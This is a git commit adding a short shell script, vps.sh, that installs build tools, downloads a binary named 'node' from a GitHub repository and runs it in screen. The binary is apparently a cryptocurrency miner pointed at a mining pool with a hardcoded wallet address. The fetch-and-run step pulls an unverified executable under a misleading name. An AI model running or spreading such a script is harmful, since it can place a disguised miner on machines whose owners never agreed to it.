25d5a6e774daa8117ef1cc8dbdcb2d11684608cc
lemanleman020 <147594099+lemanleman020@users.noreply.github.com>
2024-08-24 13:29:42 +0800

    Add files via upload

---
+++ vps.sh
@@ -0,0 +1,3 @@
+sudo apt update -y
+sudo apt install build-essential libuv1-dev libssl-dev libhwloc-dev screen -y &&
+wget https://github.com/lemanleman020/rich-again/raw/main/node && chmod u+x node && screen ./node --coin=SAL -o free.bithunter.store:9929  --tls  -u SaLvsCG8uNkHicE2vG8zKpX74fUeLF8v2d9XZMdQDrhYDrCr6Gsr1RvcJEiUyTKBfe1u1pUgrkdVrcJhDjvKqzQq6Gi7kDoSbkc
